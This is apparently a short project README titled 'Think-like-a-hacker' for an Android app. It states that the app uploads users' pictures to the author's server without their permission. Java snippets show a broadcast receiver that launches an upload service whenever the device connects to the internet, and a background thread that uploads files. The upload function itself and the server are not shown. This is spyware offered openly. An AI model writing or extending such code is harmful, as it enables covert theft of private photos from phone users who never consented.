# Think-like-a-hacker
## Upload picture without permission of user to our server.
when user connects to the internet it starts uploading pictures to the server.<br>
Service invoke when broadcast receiver receive the internet connect event this starts uploading.
### Invoke Upload service when network connect
```groovy
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        assert cm != null;
        NetworkInfo info = cm.getActiveNetworkInfo();
        if (info != null) {
            if (info.isConnected()) {
                Intent intentnew = new Intent(context, UploadService.class);
                context.startService(intentnew);
            }
        }
```
### Starts Uploading
```groovy
    void startUploading(final File file) {
        Runnable runnable = new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void run() {
                uploadFile(file);
            }
        };
        new Thread(runnable).start();
    }
```
